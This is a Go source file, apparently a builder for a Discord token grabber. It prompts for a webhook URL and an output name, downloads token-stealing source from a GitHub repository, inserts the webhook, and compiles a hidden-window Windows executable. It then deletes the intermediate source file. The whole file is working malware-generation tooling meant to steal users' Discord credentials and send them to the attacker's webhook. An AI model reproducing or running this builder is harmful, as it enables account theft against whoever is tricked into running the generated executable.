package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"strings"
)

func main() {
	var banner string = `              
     _                      
    | |_ ___    ___ ___ ___ 
    |  _| . |  | . | -_|   |
    |_| |_  |  |_  |___|_|_|
        |___|  |___|  by kp#3343

`
	fmt.Println(banner)
	_, err := exec.Command("go", "version").Output()

	if err != nil {
		fmt.Println("You must have Go installed and added to your ENVIRONMENT VARIABLES (PATH) in order to use this program.")
		fmt.Scanln()
		os.Exit(1)
	}
	fmt.Print("> Enter your Webhook URL: ")
	var url string
	fmt.Scanln(&url)
	fmt.Print("> Enter the executable name: ")
	var outputName string
	fmt.Scanln(&outputName)
	fmt.Println(" -------------------------- ")
	fmt.Println("\n # Initializing generation")
	fmt.Println("\n * Executing HTTP GET")
	resp, err := http.Get("https://raw.githubusercontent.com/pedrokpp/discord-token-grabber/main/main.go")

	if err != nil {
		fmt.Println(" ! Error while trying to HTTP GET -> ", err)
		fmt.Scanln()
		os.Exit(1)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		fmt.Println(" ! Error while reading HTTP GET body -> ", err)
		fmt.Scanln()
		os.Exit(1)
	}

	code := string(body)
	fmt.Println(" * HTTP GET done")
	fmt.Println("\n * Creating 'tg.go' file")
	actualCode := strings.Replace(code, "%s", url, -1)
	errr := ioutil.WriteFile("tg.go", []byte(actualCode), 0777)
	if errr != nil {
		fmt.Println(" ! Error while writing 'tg.go' file -> ", err)
		fmt.Scanln()
		os.Exit(1)
	}
	fmt.Println(" * 'tg.go' file created")
	fmt.Println("\n * Compiling to .exe")
	cmd := exec.Command("go", "build", "-ldflags", "-H=windowsgui", "-o", outputName+".exe", "tg.go")
	cmd.Run()
	fmt.Println(" * Compiled to .exe")
	fmt.Println("\n * Removing 'tg.go' file")
	err = os.Remove("tg.go")
	if err != nil {
		fmt.Println(" ! Error while deleting 'tg.go' file -> ", err)
		fmt.Scanln()
		os.Exit(1)
	}
	fmt.Println(" * 'tg.go' file deleted")
	fmt.Println("\n # Generation successfully finished")
	fmt.Println("\n -------------------------- ")
	fmt.Scanln()

}
